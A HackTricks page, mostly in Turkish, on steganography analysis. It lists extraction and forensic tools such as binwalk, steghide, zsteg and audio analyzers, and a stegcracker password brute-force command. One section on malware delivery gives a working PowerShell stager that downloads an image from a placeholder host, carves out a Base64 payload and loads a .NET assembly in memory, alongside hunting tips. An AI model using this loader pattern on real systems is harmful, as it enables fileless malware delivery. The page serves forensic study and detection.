# Stego Tricks

{{#include ../banners/hacktricks-training.md}}

## **Dosyalardan Veri Çıkarma**

### **Binwalk**

Gömülü gizli dosyaları ve verileri aramak için kullanılan bir araç. `apt` ile kurulur ve kaynağı [GitHub](https://github.com/ReFirmLabs/binwalk) üzerinde mevcuttur.
```bash
binwalk file # Displays the embedded data
binwalk -e file # Extracts the data
binwalk --dd ".*" file # Extracts all data
```
### **Foremost**

Başlık ve sonlarına göre dosyaları kurtarır, png görüntüler için kullanışlıdır. `apt` ile kurulabilir, kaynağı [GitHub](https://github.com/korczis/foremost) üzerindedir.
```bash
foremost -i file # Extracts data
```
### **Exiftool**

Dosya meta verilerini görüntülemeye yardımcı olur, burada mevcut [here](https://www.sno.phy.queensu.ca/~phil/exiftool/).
```bash
exiftool file # Shows the metadata
```
### **Exiv2**

exiftool'a benzer, metadata görüntüleme için. `apt` ile kurulabilir, kaynak [GitHub](https://github.com/Exiv2/exiv2) üzerinde, ve bir [resmi web sitesi](http://www.exiv2.org/) var.
```bash
exiv2 file # Shows the metadata
```
### **File**

İşlemekte olduğunuz file türünü belirleyin.

### **Strings**

Çıktıyı filtrelemek için çeşitli kodlama ayarlarını kullanarak dosyalardan okunabilir strings çıkarır.
```bash
strings -n 6 file # Extracts strings with a minimum length of 6
strings -n 6 file | head -n 20 # First 20 strings
strings -n 6 file | tail -n 20 # Last 20 strings
strings -e s -n 6 file # 7bit strings
strings -e S -n 6 file # 8bit strings
strings -e l -n 6 file # 16bit strings (little-endian)
strings -e b -n 6 file # 16bit strings (big-endian)
strings -e L -n 6 file # 32bit strings (little-endian)
strings -e B -n 6 file # 32bit strings (big-endian)
```
### **Comparison (cmp)**

Çevrimiçi bulunan orijinal sürümüyle değiştirilmiş bir dosyayı karşılaştırmak için kullanışlı.
```bash
cmp original.jpg stego.jpg -b -l
```
## **Metin İçindeki Gizli Verileri Çıkarma**

### **Boşluklardaki Gizli Veriler**

Görünüşte boş alanlardaki görünmez karakterler bilgi saklayabilir. Bu veriyi çıkarmak için şu adresi ziyaret edin [https://www.irongeek.com/i.php?page=security/unicode-steganography-homoglyph-encoder](https://www.irongeek.com/i.php?page=security/unicode-steganography-homoglyph-encoder).

## **Görsellerden Veri Çıkarma**

### **GraphicMagick ile Görüntü Detaylarını Belirleme**

[GraphicMagick](https://imagemagick.org/script/download.php) görüntü dosyası türlerini belirlemek ve olası bozulmaları tespit etmek için kullanılır. Bir görüntüyü incelemek için aşağıdaki komutu çalıştırın:
```bash
./magick identify -verbose stego.jpg
```
Hasarlı bir görüntüyü onarmayı denemek için, bir metadata yorumu eklemek yardımcı olabilir:
```bash
./magick mogrify -set comment 'Extraneous bytes removed' stego.jpg
```
### **Steghide for Data Concealment**

Steghide, `JPEG, BMP, WAV, and AU` dosyalarının içinde veri gizlemeyi sağlar; şifrelenmiş veriyi gömüp çıkarabilir. Kurulumu `apt` ile basittir, and its [source code is available on GitHub](https://github.com/StefanoDeVuono/steghide).

**Komutlar:**

- `steghide info file` bir dosyanın içinde gizli veri olup olmadığını gösterir.
- `steghide extract -sf file [--passphrase password]` gizli veriyi çıkarır; parola isteğe bağlıdır.

Web tabanlı çıkarım için [this website](https://futureboy.us/stegano/decinput.html) adresini ziyaret edin.

**Bruteforce Attack with Stegcracker:**

- To attempt password cracking on Steghide, use [stegcracker](https://github.com/Paradoxis/StegCracker.git) as follows:
```bash
stegcracker <file> [<wordlist>]
```
### **zsteg için PNG ve BMP Dosyaları**

zsteg, PNG ve BMP dosyalarında gizli verileri ortaya çıkarmada uzmanlaşmıştır. Kurulum `gem install zsteg` ile yapılır, [source on GitHub](https://github.com/zed-0xff/zsteg).

**Commands:**

- `zsteg -a file` bir dosyada tüm tespit yöntemlerini uygular.
- `zsteg -E file` veri çıkarımı için bir payload belirtir.

### **StegoVeritas ve Stegsolve**

**stegoVeritas** metadata'yı kontrol eder, görüntü dönüşümleri uygular ve LSB brute forcing gibi işlemler yapar. Tüm seçenekler için `stegoveritas.py -h` kullanın ve tüm kontrolleri çalıştırmak için `stegoveritas.py stego.jpg` kullanın.

**Stegsolve** görüntüler içinde gizli metinleri veya mesajları ortaya çıkarmak için çeşitli renk filtreleri uygular. [GitHub](https://github.com/eugenekolo/sec-tools/tree/master/stego/stegsolve/stegsolve) üzerinde mevcuttur.

### **Gizli İçerik Tespiti için FFT**

Fast Fourier Transform (FFT) teknikleri görüntülerde gizlenmiş içeriği ortaya çıkarabilir. Faydalı kaynaklar şunlardır:

- [EPFL Demo](http://bigwww.epfl.ch/demo/ip/demos/FFT/)
- [Ejectamenta](https://www.ejectamenta.com/Fourifier-fullscreen/)
- [FFTStegPic on GitHub](https://github.com/0xcomposure/FFTStegPic)

### **Stegpy — Ses ve Görüntü Dosyaları için**

Stegpy, PNG, BMP, GIF, WebP ve WAV gibi formatları destekleyerek görüntü ve ses dosyalarına bilgi gömülmesine olanak tanır. [GitHub](https://github.com/dhsdshdhk/stegpy) üzerinde mevcuttur.

### **Pngcheck — PNG Dosya Analizi için**

PNG dosyalarını analiz etmek veya orijinalliğini doğrulamak için kullanın:
```bash
apt-get install pngcheck
pngcheck stego.png
```
### **Görüntü Analizi için Ek Araçlar**

Daha fazla keşif için şunları inceleyin:

- [Magic Eye Solver](http://magiceye.ecksdee.co.uk/)
- [Image Error Level Analysis](https://29a.ch/sandbox/2012/imageerrorlevelanalysis/)
- [Outguess](https://github.com/resurrecting-open-source-projects/outguess)
- [OpenStego](https://www.openstego.com/)
- [DIIT](https://diit.sourceforge.net/)

## Görüntülere gizlenmiş, işaretleyici-ile ayrılmış Base64 payloads (malware delivery)

Commodity loader'lar giderek daha sık Base64 ile encode edilmiş payload'ları geçerli görüntülerin içine düz metin olarak saklıyor (çoğunlukla GIF/PNG). Pixel-level LSB yerine, payload dosya metni/metadata'sına gömülü benzersiz başlangıç/bitiş işaretçi string'leriyle ayrılıyor. Ardından bir PowerShell stager şunları yapar:
- HTTP(S) üzerinden görüntüyü indirir
- İşaretçi string'leri bulur (gözlemlenen örnekler: <<sudo_png>> … <<sudo_odt>>)
- Aradaki metni çıkarır ve Base64'ten decode ederek byte'lara çevirir
- .NET assembly'sini in-memory yükler ve bilinen bir giriş metodunu çağırır (disk'e herhangi bir dosya yazılmaz)

Minimal PowerShell carving/loading snippet
```powershell
$img = (New-Object Net.WebClient).DownloadString('https://example.com/p.gif')
$start = '<<sudo_png>>'; $end = '<<sudo_odt>>'
$s = $img.IndexOf($start); $e = $img.IndexOf($end)
if($s -ge 0 -and $e -gt $s){
$b64 = $img.Substring($s + $start.Length, $e - ($s + $start.Length))
$bytes = [Convert]::FromBase64String($b64)
[Reflection.Assembly]::Load($bytes) | Out-Null
}
```
Notlar
- Bu, ATT&CK T1027.003 (steganography) kapsamına girer. Marker strings kampanyalara göre değişir.
- Hunting: indirilen görüntüleri bilinen ayırıcılar için tarayın; `DownloadString`'i takiben `FromBase64String` kullanan `PowerShell`'i işaretleyin.

See also phishing delivery examples and full in-memory invocation flow here:

{{#ref}}
../generic-methodologies-and-resources/phishing-methodology/phishing-documents.md
{{#endref}}

## **Ses Dosyalarından Veri Çıkarma**

**Audio steganography** ses dosyaları içinde bilgiyi gizlemek için benzersiz bir yöntem sunar. Gizli içeriği gömmek veya çıkarmak için farklı araçlar kullanılır.

### **Steghide (JPEG, BMP, WAV, AU)**

Steghide, JPEG, BMP, WAV ve AU dosyalarına veri gizlemek için tasarlanmış çok yönlü bir araçtır. Detaylı talimatlar [stego tricks documentation](stego-tricks.md#steghide) bölümünde verilmiştir.

### **Stegpy (PNG, BMP, GIF, WebP, WAV)**

Bu araç PNG, BMP, GIF, WebP ve WAV dahil çeşitli formatlarla uyumludur. Daha fazla bilgi için [Stegpy's section](stego-tricks.md#stegpy-png-bmp-gif-webp-wav) bölümüne bakın.

### **ffmpeg**

ffmpeg, ses dosyalarının bütünlüğünü değerlendirmek için kritik öneme sahiptir; ayrıntılı bilgi sağlar ve herhangi bir uyumsuzluğu tespit eder.
```bash
ffmpeg -v info -i stego.mp3 -f null -
```
### **WavSteg (WAV)**

WavSteg, WAV dosyaları içinde veriyi en az anlamlı bit (LSB) yöntemini kullanarak gizleme ve çıkarma konusunda ustadır. Şurada bulunabilir: [GitHub](https://github.com/ragibson/Steganography#WavSteg). Komutlar şunlardır:
```bash
python3 WavSteg.py -r -b 1 -s soundfile -o outputfile

python3 WavSteg.py -r -b 2 -s soundfile -o outputfile
```
### **Deepsound**

Deepsound, ses dosyaları içinde AES-256 kullanarak bilgi şifreleme ve tespitine izin verir. İndirmek için [resmi sayfa](http://jpinsoft.net/deepsound/download.aspx) bağlantısını kullanın.

### **Sonic Visualizer**

Ses dosyalarının görsel ve analitik incelemesi için paha biçilmez bir araç olan Sonic Visualizer, diğer yollarla tespit edilemeyen gizli öğeleri ortaya çıkarabilir. Daha fazla bilgi için [resmi web sitesi](https://www.sonicvisualiser.org/) adresini ziyaret edin.

### **DTMF Tones - Dial Tones**

Ses dosyalarındaki DTMF tonlarını tespit etmek için şu çevrimiçi araçlar kullanılabilir: [bu DTMF dedektörü](https://unframework.github.io/dtmf-detect/) ve [DialABC](http://dialabc.com/sound/detect/index.html).

## **Other Techniques**

### **Binary Length SQRT - QR Code**

Karesi tam sayı olan ikili veri bir QR kodunu temsil ediyor olabilir. Kontrol etmek için bu kod parçasını kullanın:
```python
import math
math.sqrt(2500) #50
```
İkili veriyi görüntüye dönüştürmek için, [dcode](https://www.dcode.fr/binary-image) adresine bakın. QR kodlarını okumak için, [this online barcode reader](https://online-barcode-reader.inliteresearch.com/) kullanın.

### **Braille Çevirisi**

Braille çevirisi için, [Branah Braille Translator](https://www.branah.com/braille-translator) mükemmel bir kaynaktır.

## **Kaynaklar**

- [**https://0xrick.github.io/lists/stego/**](https://0xrick.github.io/lists/stego/)
- [**https://github.com/DominicBreuker/stego-toolkit**](https://github.com/DominicBreuker/stego-toolkit)
- [Unit 42 – PhantomVAI Loader Delivers a Range of Infostealers](https://unit42.paloaltonetworks.com/phantomvai-loader-delivers-infostealers/)
- [MITRE ATT&CK – Steganography (T1027.003)](https://attack.mitre.org/techniques/T1027/003/)

{{#include ../banners/hacktricks-training.md}}
